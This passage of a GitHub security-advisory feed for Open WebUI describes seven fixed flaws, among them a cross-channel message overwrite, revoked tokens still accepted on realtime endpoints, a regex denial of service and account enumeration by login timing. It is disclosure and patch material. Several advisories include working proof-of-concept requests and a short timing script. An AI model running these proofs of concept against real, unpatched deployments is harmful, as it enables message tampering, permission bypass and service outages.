<li><strong>Request-time per-entry validation</strong> (<code>backend/open_webui/main.py</code>): every entry of <code>message_ids</code> is validated against the target channel, not just the first; any entry whose target message does not belong to the channel in <code>chat_id</code> is rejected.</li>
<li><strong>Fail-closed emitter</strong> (<code>backend/open_webui/socket/main.py</code>, <code>_make_channel_emitter</code>): before writing, it re-reads the target message and returns without writing unless <code>msg.channel_id</code> matches the channel derived from <code>chat_id</code>. A missing or mismatched message is a no-op, so a write can no longer land in a channel the caller does not target.</li>
</ol>
<h2 id="poc">PoC</h2>
<p>Single-model (fixed in v0.9.6):</p>
<pre><code class="language-bash">curl -X POST http://target:8080/api/chat/completions \
  -H "Authorization: Bearer $USER_JWT" -H "Content-Type: application/json" \
  -d '{
    "model": "llama3", "stream": true,
    "chat_id": "channel:any-channel-uuid-here",
    "id": "target-message-uuid-to-overwrite",
    "messages": [{"role": "user", "content": "Repeat exactly: This message has been tampered with"}]
  }'
</code></pre>
<p>Multimodel (still works on v0.9.6):</p>
<pre><code class="language-json">POST /api/chat/completions
{
  "chat_id": "channel:&lt;attacker_channel_id&gt;",
  "message_ids": {
    "model-a": "&lt;message_id_in_attacker_channel&gt;",
    "model-b": "&lt;victim_channel_message_id&gt;"
  },
  "messages": [{"role": "user", "content": "..."}]
}
</code></pre>
<p>The first id passes channel scope validation; the second id is used by the per-model fan-out and overwrites the victim-channel message (with model output, or the provider-error string on a deterministic error). Even a failing model call writes error content to the target message.</p>
<h2 id="impact">Impact</h2>
<p><strong>Message integrity destruction:</strong> an authenticated user can overwrite a message in a channel they cannot access, regardless of membership. The overwritten message retains the original author attribution while displaying attacker-chosen content (<strong>impersonation</strong>). Private channels, DM channels, and channels the attacker has no access to are all affected; the REST channel routes correctly return 403 for the same attacker, so the bypass is specific to the chat-completion channel pipeline.</p>
<h2 id="affected-versions">Affected versions</h2>
<ul>
<li>Single-model path: introduced in commit <code>0037baeb2</code> (v0.9.5), fixed in v0.9.6 (#24725).</li>
<li>Multimodel <code>message_ids</code> path: present from v0.9.6, fixed in v0.10.0.</li>
<li>Consolidated Affected: <code>&gt;= 0.9.5, &lt; 0.10.0</code>. Patched: <code>&gt;= 0.10.0</code>.</li>
</ul>
<h2 id="distinction-from-existing-cves">Distinction from existing CVEs</h2>
<p>CVE-2026-45385 (GHSA-wwhq-cx22-f7vv) covered IDOR in the REST endpoint <code>POST /channels/{id}/messages/{message_id}/update</code> (<code>routers/channels.py</code>); its fix (commit <code>f5e110f</code>) only touched <code>channels.py</code>. This finding uses a different code path (<code>POST /api/chat/completions</code> with <code>chat_id: "channel:&lt;id&gt;"</code> → <code>main.py</code> → <code>socket/main.py:_make_channel_emitter</code>), untouched by that fix.</p>
<h2 id="suggested-fix">Suggested fix</h2>
<p>Validate <strong>every</strong> value in <code>message_ids</code> against the channel (not just the first), rejecting any whose target message does not belong to the channel in <code>chat_id</code>. Additionally, make <code>_make_channel_emitter</code> fail closed: re-check that the target message's <code>channel_id</code> matches the channel before calling <code>Messages.update_message_by_id</code>, treating a missing or mismatched message as an error/no-op.</p>
<h2 id="consolidation">Consolidation</h2>
<p>Per Open WebUI's Report Handling policy this advisory consolidates independent reports of the same chat-completions channel-overwrite flaw:</p>
<ul>
<li>Single-model cross-channel overwrite via the <code>channel:</code> path: @sfwani (earliest filing).</li>
<li>Multimodel <code>message_ids</code> fan-out variant that bypasses the v0.9.6 first-id-only gate: @DavidCarliez.</li>
</ul>
<p>One CVE for the consolidated advisory.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-x2ff-v5v8-m75m">https://github.com/open-webui/open-webui/security/advisories/GHSA-x2ff-v5v8-m75m</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/33e4e0dcc43afcca80f9c635d762cdc76c768ba9">https://github.com/open-webui/open-webui/commit/33e4e0dcc43afcca80f9c635d762cdc76c768ba9</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/ac3449cac91e62b08a7c28e54fcd044d14dea791">https://github.com/open-webui/open-webui/commit/ac3449cac91e62b08a7c28e54fcd044d14dea791</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0">https://github.com/open-webui/open-webui/releases/tag/v0.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-x2ff-v5v8-m75m">https://github.com/advisories/GHSA-x2ff-v5v8-m75m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x2ff-v5v8-m75m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T17:01:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Realtime endpoints accept Redis-revoked JWTs after signout/backchannel logout]]></title>
        <id>https://github.com/advisories/GHSA-855v-hq7w-jmjw</id>
        <link href="https://github.com/advisories/GHSA-855v-hq7w-jmjw"/>
        <updated>2026-07-24T17:00:13.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>With Redis configured, Open WebUI supports JWT revocation: <code>POST /api/v1/auths/signout</code> (per-token <code>jti</code>) and OIDC back-channel logout (per-user <code>revoked_at</code>) record revocations in Redis, and HTTP auth (<code>get_current_user</code>) rejects revoked tokens with 401. The realtime authentication surfaces do not perform this check: Socket.IO connect / user-join / join-channels / join-note and the terminal websocket first-message auth validate tokens with <code>decode_token()</code> only (signature + expiry). A JWT revoked by sign-out or back-channel logout therefore continues to authenticate new realtime connections, even though the same token is rejected on HTTP.</p>
<h2 id="affected-component">Affected component</h2>
<ul>
<li><code>backend/open_webui/socket/main.py</code> — Socket.IO <code>connect</code>, <code>user-join</code>, <code>join-channels</code>, <code>join-note</code></li>
<li><code>backend/open_webui/routers/terminals.py</code> — terminal websocket first-message auth</li>
<li><code>backend/open_webui/utils/auth.py</code> — the revocation check was applied to HTTP only</li>
</ul>
<h2 id="root-cause">Root cause</h2>
<p>HTTP auth enforces revocation:</p>
<pre><code class="language-python"># utils/auth.py — get_current_user
if data.get('jti') and not await is_valid_token(request, data):
    raise HTTPException(status_code=401, detail='Invalid token')
</code></pre>
<p>Realtime auth calls <code>decode_token()</code> only, which verifies signature + expiry but never consults the Redis revocation keys (<code>{prefix}:auth:token:{jti}:revoked</code>, <code>{prefix}:auth:user:{id}:revoked_at</code>):</p>
<pre><code class="language-python"># socket/main.py — connect / user-join / join-channels / join-note
data = decode_token(auth['token'])
# routers/terminals.py — _resolve_authenticated_connection
data = decode_token(token)
</code></pre>
<h2 id="impact">Impact</h2>
<p>A JWT revoked by user sign-out or OIDC back-channel logout still authenticates new realtime connections. A stolen token therefore retains realtime access after the victim signs out or the IdP performs back-channel logout — the very remediation for a compromised token. The token can populate <code>SESSION_POOL</code> as the victim, join their user/channel/note rooms (receiving realtime channel messages, collaborative-note updates and presence), drive socket-level collaboration as the victim, and pass terminal websocket authentication when terminal servers are configured. HTTP remains correctly protected (401), so REST data and state-changing REST endpoints are not reachable with the revoked token.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Reporter PoC on a Redis-backed deployment (v0.9.6 and main): after <code>POST /api/v1/auths/signout</code>, HTTP returns 401 for the token while a Socket.IO user-join with the same token still authenticates, and the terminal WS reaches terminal-server lookup rather than rejecting it as <code>Invalid token</code>.</p>
<h2 id="fix">Fix</h2>
<p>Apply the revocation check on the realtime paths. The logic is factored into <code>is_token_revoked(redis, decoded)</code> (covering per-token <code>jti</code> and per-user <code>revoked_at</code>); the Socket.IO handlers and the terminal WS reject tokens that fail it, using the main app Redis where revocations are stored. HTTP <code>is_valid_token</code> delegates to the same helper, so HTTP behaviour is unchanged.</p>
<h2 id="affected--patched">Affected / Patched</h2>
<ul>
<li>Affected: <code>&gt;= 0.9.0, &lt; 0.10.0</code>, and only when Redis is configured (without Redis, per-token revocation is not supported and sign-out does not invalidate JWTs by design).</li>
<li>Patched: v0.10.0. The revocation check (<code>is_valid_token</code>, covering per-token <code>jti</code> and per-user <code>revoked_at</code>) is applied on Socket.IO connect / user-join / join-channels / join-note and the terminal websocket first-message auth, using the main app Redis where revocations are stored. HTTP <code>is_valid_token</code> delegates to the same logic, so HTTP behaviour is unchanged.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-855v-hq7w-jmjw">https://github.com/open-webui/open-webui/security/advisories/GHSA-855v-hq7w-jmjw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59219">https://nvd.nist.gov/vuln/detail/CVE-2026-59219</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/33b91bd8ae8a100a5a306c91441a7d0b422c4cde">https://github.com/open-webui/open-webui/commit/33b91bd8ae8a100a5a306c91441a7d0b422c4cde</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0">https://github.com/open-webui/open-webui/releases/tag/v0.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-855v-hq7w-jmjw">https://github.com/advisories/GHSA-855v-hq7w-jmjw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-855v-hq7w-jmjw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T17:00:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Unauthenticated WebSocket Access to Collaborative Document Handlers (ydoc:awareness:update, ydoc:document:leave)]]></title>
        <id>https://github.com/advisories/GHSA-gmfw-g93r-vg53</id>
        <link href="https://github.com/advisories/GHSA-gmfw-g93r-vg53"/>
        <updated>2026-07-24T16:59:45.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The Socket.IO server is configured with <code>always_connect=True</code> (lines 78, 91 in <code>backend/open_webui/socket/main.py</code>) and the <code>connect</code> handler (line 329) never rejects unauthenticated connections. Two Ydoc event handlers have zero authentication checks, allowing unauthenticated clients to interact with collaborative document sessions.</p>
<h2 id="vulnerable-code">Vulnerable Code</h2>
<h3 id="ydocawarenessupdate-line-741--no-auth-check-at-all"><code>ydoc:awareness:update</code> (line 741) — No auth check at all</h3>
<pre><code class="language-python">@sio.on('ydoc:awareness:update')
async def yjs_awareness_update(sid, data):
    document_id = data['document_id']
    user_id = data.get('user_id', sid)
    update = data['update']
    # No SESSION_POOL check, no room membership check
    await sio.emit(
        'ydoc:awareness:update',
        {'document_id': document_id, 'user_id': user_id, 'update': update},
        room=f'doc_{document_id}',
        skip_sid=sid,
    )
</code></pre>
<h3 id="ydocdocumentleave-line-711--no-auth-check-at-all"><code>ydoc:document:leave</code> (line 711) — No auth check at all</h3>
<pre><code class="language-python">@sio.on('ydoc:document:leave')
async def yjs_document_leave(sid, data):
    document_id = data['document_id']
    user_id = data.get('user_id', sid)
    # No auth check
    await YDOC_MANAGER.remove_user(document_id=document_id, user_id=sid)
    await sio.emit('ydoc:user:left',
        {'document_id': document_id, 'user_id': user_id},
        room=f'doc_{document_id}')
</code></pre>
<h3 id="root-cause-always_connecttrue-line-78">Root Cause: <code>always_connect=True</code> (line 78)</h3>
<pre><code class="language-python">sio = socketio.AsyncServer(
    always_connect=True,   # Never rejects connections
    ...
)
</code></pre>
<p>The <code>connect</code> handler (line 329) adds authenticated users to <code>SESSION_POOL</code> but never returns <code>False</code> or raises an exception for unauthenticated connections.</p>
<h2 id="exploitation">Exploitation</h2>
<ol>
<li>An unauthenticated attacker connects via Socket.IO (no token needed)</li>
<li>The attacker emits <code>ydoc:awareness:update</code> with:<ul>
<li><code>document_id</code>: a known/guessed note UUID (format: <code>note:{uuid}</code>)</li>
<li><code>user_id</code>: spoofed to impersonate any user</li>
<li><code>update</code>: arbitrary awareness data (fake cursor positions, selections)</li>
</ul>
</li>
<li>The fake awareness data is broadcast to all legitimate users in the document room</li>
<li>The attacker can also emit <code>ydoc:document:leave</code> with spoofed <code>user_id</code> to broadcast fake <code>ydoc:user:left</code> events</li>
</ol>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>UI disruption</strong>: Fake cursor positions and user presence in collaborative editing sessions</li>
<li><strong>User impersonation</strong>: Attacker can spoof any <code>user_id</code> in awareness updates</li>
<li><strong>Resource exhaustion</strong>: Unlimited unauthenticated WebSocket connections maintained by the server</li>
</ul>
<p>Note: Other Ydoc handlers (<code>ydoc:document:join</code>, <code>ydoc:document:update</code>, <code>ydoc:document:state</code>) correctly check <code>SESSION_POOL</code> membership.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<ol>
<li>Set <code>always_connect=False</code> or reject unauthenticated connections in the <code>connect</code> handler</li>
<li>Add <code>SESSION_POOL</code> checks to <code>ydoc:awareness:update</code> and <code>ydoc:document:leave</code></li>
<li>Add room membership verification before broadcasting to document rooms</li>
</ol>
<hr>
<blockquote>
<p><strong>AI Disclosure (per Rule 11):</strong> AI (Claude) was used to assist with source code review, identifying potential vulnerability patterns, and drafting this report. The researcher directed the analysis, selected focus areas, and independently verified all findings against a running v0.8.12 Docker instance using real HTTP requests with two test accounts. The PoCs included are reproducible and were confirmed live before submission.</p>
</blockquote>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-gmfw-g93r-vg53">https://github.com/open-webui/open-webui/security/advisories/GHSA-gmfw-g93r-vg53</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59715">https://nvd.nist.gov/vuln/detail/CVE-2026-59715</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/25946">https://github.com/open-webui/open-webui/pull/25946</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/22f2fe1ffb66c993dad1e0b2b35514acaed2370e">https://github.com/open-webui/open-webui/commit/22f2fe1ffb66c993dad1e0b2b35514acaed2370e</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0">https://github.com/open-webui/open-webui/releases/tag/v0.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-gmfw-g93r-vg53">https://github.com/advisories/GHSA-gmfw-g93r-vg53</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gmfw-g93r-vg53</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-07-24T16:59:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: POST /api/v1/images/edit bypasses the global image-edit switch and the per-user image-generation permission]]></title>
        <id>https://github.com/advisories/GHSA-rqj7-6wrp-6g2g</id>
        <link href="https://github.com/advisories/GHSA-rqj7-6wrp-6g2g"/>
        <updated>2026-07-24T16:58:48.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>POST /api/v1/images/edit</code> performed no authorization beyond requiring a verified account. Every other image-editing surface in Open WebUI enforces the global image-edit switch and the per-user image-generation permission — the <code>/api/v1/images/generations</code> route, the built-in <code>edit_image</code> tool, and the chat image-edit middleware — but the direct edit route enforced neither. A verified non-admin user could therefore invoke server-side image editing, reaching the configured image-edit provider with the administrator's credentials, even when the administrator had globally disabled image editing (<code>ENABLE_IMAGE_EDIT=False</code>) or denied that user image-generation permission. The image-editing UI is surfaced only to administrators (Playground), so the route additionally exposed an admin-only capability to any verified user.</p>
<h2 id="impact">Impact</h2>
<p>An authenticated, non-admin user can:</p>
<ul>
<li>bypass the global <code>ENABLE_IMAGE_EDIT=False</code> administrator control;</li>
<li>bypass a denied per-user/group <code>features.image_generation</code> permission;</li>
<li>cause the server to send billable image-edit requests to the configured provider (OpenAI-compatible, Gemini, or ComfyUI) using administrator-configured credentials (<code>IMAGES_EDIT_OPENAI_API_KEY</code> for the OpenAI engine).</li>
</ul>
<p>No cross-user data is exposed and the provider credentials are never returned to the caller; the impact is the control/permission bypass and the associated billable resource consumption.</p>
<h2 id="affected-versions">Affected Versions</h2>
<p><code>&gt;= 0.8.11, &lt; 0.10.0</code> (the <code>/api/v1/images/edit</code> route was introduced in 0.8.11 and was ungated from the outset). Fixed in <strong>v0.10.0</strong>.</p>
<h2 id="details">Details</h2>
<p><code>/api/v1/images/generations</code> enforces <code>ENABLE_IMAGE_GENERATION</code> (403 if globally disabled) and <code>features.image_generation</code> (403 for non-admins without the permission). The <code>edit_image</code> built-in tool and the chat image-edit middleware likewise gate on <code>ENABLE_IMAGE_EDIT</code> and <code>features.image_generation</code>. The direct <code>POST /api/v1/images/edit</code> route ran on <code>Depends(get_verified_user)</code> alone and proceeded straight to provider dispatch, applying none of these controls.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>As a verified non-admin user, with image editing globally disabled (<code>ENABLE_IMAGE_EDIT=False</code>) or <code>features.image_generation</code> denied for the user:</p>
<pre><code class="language-http">POST /api/v1/images/edit
Authorization: Bearer &lt;non_admin_user_token&gt;
Content-Type: application/json

{"image":"data:image/png;base64,&lt;png&gt;","prompt":"edit","model":"gpt-image-1"}
</code></pre>
<p>The request reaches the configured image-edit provider and returns an edited image despite the disabled control/permission.</p>
<h2 id="patch">Patch</h2>
<p>The direct route is split from its shared implementation (mirroring <code>generate_images</code>/<code>image_generations</code>): a thin <code>/edit</code> route now enforces <code>ENABLE_IMAGE_EDIT</code> and the per-user <code>features.image_generation</code> permission before delegating to the shared <code>image_edits()</code> implementation. The internal callers (the <code>edit_image</code> tool and the chat middleware) call the implementation directly and already gate themselves, so they are unaffected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-rqj7-6wrp-6g2g">https://github.com/open-webui/open-webui/security/advisories/GHSA-rqj7-6wrp-6g2g</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59227">https://nvd.nist.gov/vuln/detail/CVE-2026-59227</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/26009">https://github.com/open-webui/open-webui/pull/26009</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/e038bab66dec8d17212eec35b5cb6d6b785a4200">https://github.com/open-webui/open-webui/commit/e038bab66dec8d17212eec35b5cb6d6b785a4200</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0">https://github.com/open-webui/open-webui/releases/tag/v0.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-rqj7-6wrp-6g2g">https://github.com/advisories/GHSA-rqj7-6wrp-6g2g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rqj7-6wrp-6g2g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-24T16:58:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: ReDoS in skill-mention regexes causes whole-instance DoS on default config]]></title>
        <id>https://github.com/advisories/GHSA-ffpj-xv5c-p3gw</id>
        <link href="https://github.com/advisories/GHSA-ffpj-xv5c-p3gw"/>
        <updated>2026-07-24T16:55:58.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Two regexes in <code>backend/open_webui/utils/middleware.py</code> that parse <code>&lt;$skillId|label&gt;</code> skill-mention tags backtrack in O(n²) on input that contains <code>&lt;$</code> followed by a long run with no closing <code>&gt;</code>. Both run synchronously, on the asyncio event loop, on <strong>every</strong> chat completion with no feature gate. Because the default deployment is a single uvicorn worker, one such input pins a CPU core inside <code>re</code> and freezes the entire instance for all users until the worker is killed. Any authenticated user can trigger it with one chat message; it also fires accidentally on benign retrieved content (a RAG chunk or tool output) containing the pattern.</p>
<h2 id="affected-versions">Affected versions</h2>
<p><code>&gt;= 0.9.2, &lt; 0.10.0</code>. Fixed in <strong>v0.10.0</strong> (there is no 0.9.7 release).</p>
<ul>
<li><code>SKILL_MENTION_RE</code> (the extract pattern) has been O(n²) since <strong>v0.9.2</strong>; exploitable on 0.9.2–0.9.5 with a large input (hundreds of KB).</li>
<li><strong>v0.9.6</strong> added a second, far more aggressive O(n²) in the strip pattern (introduced by the "keep label as readable text" change), so on 0.9.6 a small input is enough to hang the instance.</li>
</ul>
<p>Both are fixed by the same patch.</p>
<h2 id="affected-component">Affected component</h2>
<p><code>backend/open_webui/utils/middleware.py</code> (line numbers as of v0.9.6):</p>
<pre><code class="language-python"># line 2223 — used by extract_skill_ids_from_messages(), called unconditionally (~line 2625)
SKILL_MENTION_RE = re.compile(r'&lt;\$([^|&gt;]+)\|?[^&gt;]*&gt;')

# line 2247 — used by strip_skill_mentions(), called unconditionally (line 2662)
strip_re = re.compile(r'&lt;\$[^|&gt;]+\|?([^&gt;]*)&gt;')
</code></pre>
<p><code>extract_skill_ids_from_messages()</code> runs before the <code>if all_skill_ids:</code> block (that guard gates only skill <em>injection</em>, not the regex), and <code>strip_skill_mentions()</code> runs with no guard at all. Neither requires a skill to exist or any setting to be enabled. Both functions are plain synchronous calls inside the async <code>process_chat_payload</code> coroutine, so they block the event loop; with the default <code>UVICORN_WORKERS=1</code> (<code>backend/start.sh</code>) the whole instance stalls.</p>
<h2 id="root-cause">Root cause</h2>
<p><code>[^|&gt;]</code> is a subset of <code>[^&gt;]</code>, so the quantifier pair <code>[^|&gt;]+ \|? [^&gt;]*</code> is ambiguous: on input that never closes with <code>&gt;</code>, <code>[^|&gt;]+</code> greedily consumes the tail, <code>&gt;</code> fails, and the engine backtracks through every split point between <code>[^|&gt;]+</code> and <code>[^&gt;]*</code> — O(n) positions each doing O(n) work. Polynomial, not exponential, but more than enough to hang a single worker on a ~100 KB input.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>Standalone (no Open WebUI required):</p>
<pre><code class="language-python">import re, time
EXTRACT = re.compile(r'&lt;\$([^|&gt;]+)\|?[^&gt;]*&gt;')
STRIP   = re.compile(r'&lt;\$[^|&gt;]+\|?([^&gt;]*)&gt;')
for n in (8_000, 16_000, 32_000, 64_000):
    s = '&lt;$' + ('a' * n)
    for name, rx in (('extract', EXTRACT), ('strip', STRIP)):
        t = time.perf_counter(); rx.search(s)
        print(f'n={n:&gt;6} {name:&gt;7} = {(time.perf_counter()-t)*1000:8.1f} ms')
</code></pre>
<p>Time quadruples per doubling of <code>n</code> (textbook O(n²)); the strip pattern runs for ~6 seconds on a 64k blob and for minutes on a ~96 KB one.</p>
<p>End-to-end against a live instance (default config):</p>
<ol>
<li><code>docker run ghcr.io/open-webui/open-webui:v0.9.6</code> on defaults.</li>
<li>Log in as any user (no admin or skill setup).</li>
<li>Send a chat message containing <code>&lt;$</code> followed by 50k+ characters with no <code>&gt;</code>.</li>
<li>One CPU core pegs in <code>re</code>; UI and API stop responding for every user until the worker is killed.</li>
</ol>
<h2 id="patch">Patch</h2>
<p>Rewrite the optional <code>|label</code> as a non-capturing optional group so the two quantifiers no longer overlap. Both patterns become linear; captures and substituted output are unchanged on well-formed <code>&lt;$id|label&gt;</code>, <code>&lt;$id|&gt;</code>, and bare <code>&lt;$id&gt;</code> mentions.</p>
<pre><code class="language-python">SKILL_MENTION_RE = re.compile(r'&lt;\$([^|&gt;]+)(?:\|[^&gt;]*)?&gt;')
strip_re         = re.compile(r'&lt;\$[^|&gt;]+(?:\|([^&gt;]*))?&gt;')
</code></pre>
<p>After the patch the same hostile input returns in under 1 ms. Shipped in v0.10.0.</p>
<h2 id="credit">Credit</h2>
<p>Reported by @Vlad-WKG, including a correct root-cause analysis and patch.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-ffpj-xv5c-p3gw">https://github.com/open-webui/open-webui/security/advisories/GHSA-ffpj-xv5c-p3gw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59220">https://nvd.nist.gov/vuln/detail/CVE-2026-59220</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/61a26722155ec6ee1b629cf8dfcf975098c18331">https://github.com/open-webui/open-webui/commit/61a26722155ec6ee1b629cf8dfcf975098c18331</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0">https://github.com/open-webui/open-webui/releases/tag/v0.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-ffpj-xv5c-p3gw">https://github.com/advisories/GHSA-ffpj-xv5c-p3gw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ffpj-xv5c-p3gw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-24T16:55:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Scheduled automations continue after pending-user deactivation and stored model ACL revocation]]></title>
        <id>https://github.com/advisories/GHSA-mvx4-532p-xfm9</id>
        <link href="https://github.com/advisories/GHSA-mvx4-532p-xfm9"/>
        <updated>2026-07-24T16:55:33.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Title:</strong> Scheduled automations continue after pending-user deactivation and stored model ACL revocation</p>
<h3 id="summary">Summary</h3>
<p>Open WebUI documents <code>pending</code> as a zero-access role used for new sign-ups and deactivated users, and normal HTTP routes enforce that with <code>get_verified_user()</code> (which rejects <code>pending</code>), while automation create/update/run routes additionally require the <code>features.automations</code> permission. Two paths missed that lifecycle gate, so a deactivated (<code>pending</code>) account could keep acting through the background automation scheduler:</p>
<ol>
<li><strong>Scheduler did not re-gate the owner.</strong> When a stored automation became due, <code>execute_automation()</code> rehydrated the owner with <code>Users.get_user_by_id(...)</code> and re-entered the chat completion pipeline without re-checking that the owner was still <code>user</code>/<code>admin</code> or still held <code>features.automations</code>. A still-active automation therefore kept running after its owner was deactivated.</li>
<li><strong>Model ACL only enforced for exact role <code>user</code>.</strong> <code>check_model_access()</code> applied private-model grants only when <code>user.role == "user"</code>, so a <code>pending</code> principal fell through a branch that denies a normal non-owner <code>user</code>.</li>
</ol>
<p>Net effect: a deactivated account could continue scheduled chat generation through the background worker, consuming the operator's configured model-provider credentials and reaching a stored automation model ID that its current role/ACL state would no longer permit through normal routes.</p>
<h3 id="impact">Impact</h3>
<p>A <code>pending</code>/deactivated account continues to execute due scheduled automations after its access has been revoked, consuming the operator's provider credentials, quota and shared capacity, and bypassing the private-model ACL for the automation's stored model ID. Exploitation requires a previously created active automation and a later transition to <code>pending</code> (deactivation or approval rollback), so it is bounded and not interactive. It does not grant unauthenticated access, account takeover, code execution, or cross-user data exfiltration.</p>
<h3 id="patched">Patched</h3>
<p>In 0.10.0:</p>
<ul>
<li><code>execute_automation()</code> aborts and records an error unless the rehydrated owner is still <code>user</code> or <code>admin</code> and (for non-admins) still holds <code>features.automations</code>, so a deactivated or de-permissioned owner's due automation no longer runs.</li>
<li><code>check_model_access()</code> enforces model ACLs for every non-admin role rather than only the exact role <code>user</code>, so a <code>pending</code> or otherwise unrecognised role no longer falls through.</li>
</ul>
<h3 id="credits">Credits</h3>
<p>@rexpository</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-mvx4-532p-xfm9">https://github.com/open-webui/open-webui/security/advisories/GHSA-mvx4-532p-xfm9</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59226">https://nvd.nist.gov/vuln/detail/CVE-2026-59226</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/26047">https://github.com/open-webui/open-webui/pull/26047</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/920b655f4689e2118de928fbc936f6ebd4fed396">https://github.com/open-webui/open-webui/commit/920b655f4689e2118de928fbc936f6ebd4fed396</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0">https://github.com/open-webui/open-webui/releases/tag/v0.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-mvx4-532p-xfm9">https://github.com/advisories/GHSA-mvx4-532p-xfm9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mvx4-532p-xfm9</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-07-24T16:55:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Account enumeration via observable login timing discrepancy]]></title>
        <id>https://github.com/advisories/GHSA-7rw5-9f7q-xj36</id>
        <link href="https://github.com/advisories/GHSA-7rw5-9f7q-xj36"/>
        <updated>2026-07-24T16:55:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>/api/v1/auths/signin</code> endpoint leaked whether an email address belonged to a registered account through a response-time side channel. Password verification ran bcrypt only when the email was found in the database; for a non-existent email the request returned early without hashing. The expensive bcrypt comparison therefore made valid-account attempts respond significantly slower (<del>180 ms) than non-existent ones (</del>5 ms), so an unauthenticated attacker could enumerate valid accounts by measuring response time.</p>
<h3 id="details">Details</h3>
<p>On signin the backend looked the user up by email and only performed the bcrypt password comparison if a record existed. A missing email short-circuited before any hashing, producing the timing gap. The built-in brute-force throttling did not prevent it: sending one request at a time with a small delay between requests stays under the rate limit while still exposing the difference.</p>
<p>Observed in the reporter's run (HTTP 400 for every attempt, the response time is the signal):</p>
<pre><code>Email                Status   Response time
joe@example.com      400      186 ms   &lt;- valid account
larry@example.com    400        9 ms
jose@example.com     400        6 ms
james@example.com    400        5 ms
</code></pre>
<h3 id="impact">Impact</h3>
<p>An unauthenticated attacker can enumerate which email addresses are registered accounts, which enables targeted password-spraying against confirmed accounts. The impact is amplified by MFA not being enabled by default. No data is read or modified; the disclosure is limited to account existence.</p>
<h3 id="patched">Patched</h3>
